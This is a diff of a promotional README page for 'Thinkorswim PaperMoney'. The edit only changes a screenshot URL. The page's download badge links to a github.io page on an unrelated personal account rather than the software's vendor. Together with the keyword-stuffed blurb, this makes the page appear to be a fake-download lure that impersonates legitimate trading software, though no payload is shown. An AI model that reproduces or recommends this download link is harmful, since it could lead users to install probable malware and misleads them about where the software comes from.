@@ -29,7 +29,7 @@ Thinkorswim PaperMoney real time data availability can depend on account permiss
 
 [![Download Thinkorswim PaperMoney](https://img.shields.io/badge/Download-Thinkorswim_PaperMoney-blueviolet?style=for-the-badge&logo=charles&logoColor=white)](https://afsardenkel31825.github.io/.github/thinkorswim-paperMoney-app)
 
-![Thinkorswim PaperMoney trading workspace with charts watchlists and simulated positions](https://ibb.co/5X4JJc2h)
+![Thinkorswim PaperMoney trading workspace with charts watchlists and simulated positions](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQm1gbhF4aKDoDR_xyCriRFCKlTSFQlnpDLkRGkiVrdnaxCCYMvT-DdhR0V&s=10)
 
 Download Thinkorswim PaperMoney to practice stocks, options, and forex with a realistic virtual trading platform before using live funds. Explore charts, strategies, order types, and risk-free market tools with Thinkorswim PaperMoney tutorial guidance for confident skill building.
 
